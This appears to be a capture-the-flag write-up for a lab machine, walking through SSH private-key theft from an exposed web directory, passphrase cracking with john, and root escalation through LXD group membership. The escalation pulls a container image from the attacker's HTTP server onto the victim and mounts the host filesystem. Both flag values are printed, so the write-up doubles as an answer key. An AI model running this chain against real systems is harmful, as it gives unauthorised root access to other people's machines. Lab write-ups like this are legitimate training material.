# GAMING SERVER

## FLAG 1
Flag 1 is quite simple. Using gobuster to enumerate the webpage, a `/secret` directory was found. Download the file `secretKey` and `chmod 600 secretKey` as it was a ssh private key. The private key was password protected, therefore we need to crack it with john. The `dict/lst` file we found on `/upload` can be used as a dictionary.

After we crack the password, connect to the machine with username john. It was mentioned in a comment on the home page. And we get the `user.txt`

Complete command as follow
```bash
gobuster dir -u <IP ADDR> -w <WORDLIST>
wget http://<IP ADDR>/secret/secretKey
chmod 600 secretKey
/usr/share/john/ssh2john.py seretKey > hash.txt
john hash.txt --wordlist=dict.lst
ssh john@<IP ADDR> -i secretKey
# Enter the passphrase here
cd && cat user.txt
# a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

## FLAG 2
Flag 2 was quite tricky. The vulnerability here is that we are added into the lxd group. This can be seen by running `id`.
```bash
id
# uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

I refered to [this article](https://www.hackingarticles.in/lxd-privilege-escalation/) for the steps.
First we need to clone the github repo into our own machine, then build it. Next, upload the tar file onto the victim machine and using lxc to import the image and make all the config. Then we can access the flag.

Complete command as follow
```bash
# On our machine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

# After it is done we should see a alpine-v3.12-x86_64-20200901_2136.tar.gz file
# Now setup a server which contains the file for the victim to download.

python3 -m http.server

# On the victim machine
cd /tmp
wget http://<YOUR IP ADDR>:8000/alpine-v3.12-x86_64-20200901_2136.tar.gz
lxc image import ./alpine-v3.12-x86_64-20200901_2136.tar.gz --alias myimage
lxc image list # Check if it has successfully imported
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root/ recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# Now we are root. Note that /bin/bash does not work.
cd /mnt/root/root
cat root.txt
# 2e337b8c9f3aff0c2b3e8d4e6a7c88fc

# if you want to stop the image, run
lxc stop ignite
```